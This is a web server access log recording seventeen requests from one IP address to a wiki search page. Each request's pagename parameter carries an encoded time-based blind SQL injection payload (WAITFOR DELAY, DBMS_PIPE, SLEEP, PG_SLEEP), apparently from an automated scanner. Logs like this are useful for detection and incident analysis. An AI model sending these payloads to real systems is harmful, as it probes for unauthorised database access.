81.19.136.15 - - [18/Oct/2022:09:03:13 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&q=1 HTTP/1.1" 200 64050 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:03:15 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%25%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&q=1 HTTP/1.1" 200 64051 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:03:18 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2886%29%7C%7CCHR%28112%29%7C%7CCHR%2897%29%7C%7CCHR%28103%29%2C5%29%20FROM%20DUAL--&q=1 HTTP/1.1" 200 64096 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:03:20 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2886%29%7C%7CCHR%28112%29%7C%7CCHR%2897%29%7C%7CCHR%28103%29%2C5%29%20FROM%20DUAL--&q=1 HTTP/1.1" 200 64095 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:03:22 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%27%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2886%29%7C%7CCHR%28112%29%7C%7CCHR%2897%29%7C%7CCHR%28103%29%2C5%29%20FROM%20DUAL--&q=1 HTTP/1.1" 200 64102 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:03:24 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2886%29%7C%7CCHR%28112%29%7C%7CCHR%2897%29%7C%7CCHR%28103%29%2C5%29%20FROM%20DUAL--&q=1 HTTP/1.1" 200 64101 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:03:27 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%25%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2886%29%7C%7CCHR%28112%29%7C%7CCHR%2897%29%7C%7CCHR%28103%29%2C5%29%20FROM%20DUAL--&q=1 HTTP/1.1" 200 64102 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:03:28 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%29%20AND%20SLEEP%285%29%20AND%20%286901%3D6901&q=1 HTTP/1.1" 200 64039 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:03:30 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%20AND%20SLEEP%285%29&q=1 HTTP/1.1" 200 64023 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:03:33 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%27%29%20AND%20SLEEP%285%29%20AND%20%28%27SQeU%27%3D%27SQeU&q=1 HTTP/1.1" 200 64063 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:03:34 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%27%20AND%20SLEEP%285%29%20AND%20%27OYkh%27%3D%27OYkh&q=1 HTTP/1.1" 200 64061 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:03:36 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%25%27%20AND%20SLEEP%285%29%20AND%20%27%25%27%3D%27&q=1 HTTP/1.1" 200 64055 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:03:39 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%20AND%20SLEEP%285%29--%20TpDj&q=1 HTTP/1.1" 200 64030 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:03:40 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%29%20AND%203206%3D%28SELECT%203206%20FROM%20PG_SLEEP%285%29%29%20AND%20%288768%3D8768&q=1 HTTP/1.1" 200 64066 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:03:43 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%20AND%203206%3D%28SELECT%203206%20FROM%20PG_SLEEP%285%29%29&q=1 HTTP/1.1" 200 64050 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:03:45 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%27%29%20AND%203206%3D%28SELECT%203206%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%27Famo%27%3D%27Famo&q=1 HTTP/1.1" 200 64090 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:03:47 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%27%20AND%203206%3D%28SELECT%203206%20FROM%20PG_SLEEP%285%29%29%20AND%20%27dvTh%27%3D%27dvTh&q=1 HTTP/1.1" 200 64088 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
